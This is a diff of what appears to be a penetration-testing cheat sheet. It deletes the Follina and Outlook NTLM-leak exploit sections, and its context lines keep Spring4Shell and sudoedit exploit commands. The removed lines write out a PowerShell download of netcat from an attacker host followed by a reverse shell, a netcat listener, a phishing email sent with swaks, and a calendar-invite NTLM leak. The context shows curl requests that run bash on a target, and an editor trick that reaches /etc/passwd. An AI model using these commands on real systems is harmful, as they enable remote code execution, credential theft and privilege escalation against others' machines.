@@ -157,11 +157,9 @@ Thank you for reading.
 		- [CVE-2021-44228: Log4Shell RCE (0-day)](#cve-2021-44228-log4shell-rce-0-day)
 		- [CVE-2022-0847: Dirty Pipe LPE](#cve-2022-0847-dirty-pipe-lpe)
 		- [CVE-2022-22963: Spring4Shell RCE (0-day)](#cve-2022-22963-spring4shell-rce-0-day)
-		- [CVE-2022-30190: MS-MSDT Follina RCE](#cve-2022-30190-ms-msdt-follina-rce)
 		- [CVE-2022-31214: Firejail LPE](#cve-2022-31214-firejail-lpe)
 		- [CVE-2023-21746: Windows NTLM EoP LocalPotato LPE](#cve-2023-21746-windows-ntlm-eop-localpotato-lpe)
 		- [CVE-2023-22809: Sudo Bypass](#cve-2023-22809-sudo-bypass)
-		- [CVE-2023-23397: Microsoft Outlook (Click-to-Run) PE (0-day) (PowerShell Implementation)](#cve-2023-23397-microsoft-outlook-click-to-run-pe-0-day-powershell-implementation)
 		- [CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)](#cve-2023-32629-cve-2023-2640-gameoverlay-ubuntu-kernel-exploit-lpe-0-day)
   		- [CVE-2023-4911: Looney Tunables LPE](#cve-2023-4911-looney-tunables-lpe)
    		- [CVE-2023-7028: GitLab Account Takeover](#cve-2023-7028-gitlab-account-takeover)
@@ -4759,26 +4757,6 @@ curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-exp
 curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /dev/shm/<FILE>")' --data-raw 'data' -v
 ```
 
-#### CVE-2022-30190: MS-MSDT Follina RCE
-
-> https://github.com/JohnHammond/msdt-follina
-
-```c
-python3 follina.py -p 80 -c 'powershell.exe Invoke-WebRequest http://<LHOST>:8000/nc64.exe -OutFile C:\\Windows\\Tasks\\nc64.exe; C:\\Windows\\Tasks\\nc64.exe -e cmd.exe <LHOST> <LPORT>'
-```
-
-```c
-python3 -m http.server 8000
-```
-
-```c
-nc -lnvp <LPORT>
-```
-
-```c
-swaks --to <EMAIL> --from <EMAIL> --server <RHOST> --body "http://<LHOST>/"
-```
-
 #### CVE-2022-31214: Firejail LPE
 
 > https://seclists.org/oss-sec/2022/q2/188
@@ -5115,13 +5093,6 @@ EDITOR="vi -- /etc/passwd" sudoedit /etc/motd
 
 ```c
 sudoedit /etc/motd
-```
-
-#### CVE-2023-23397: Microsoft Outlook (Click-to-Run) PE (0-day) (PowerShell Implementation)
-
-```c
-Import-Module .\CVE-2023-23397.ps1
-Send-CalendarNTLMLeak -recipient "<EMAIL>" -remotefilepath "\\<LHOST>\<FILE>.wav" -meetingsubject "<SUBJECT>" -meetingbody "<TEXT>"
 ```
 
 #### CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)
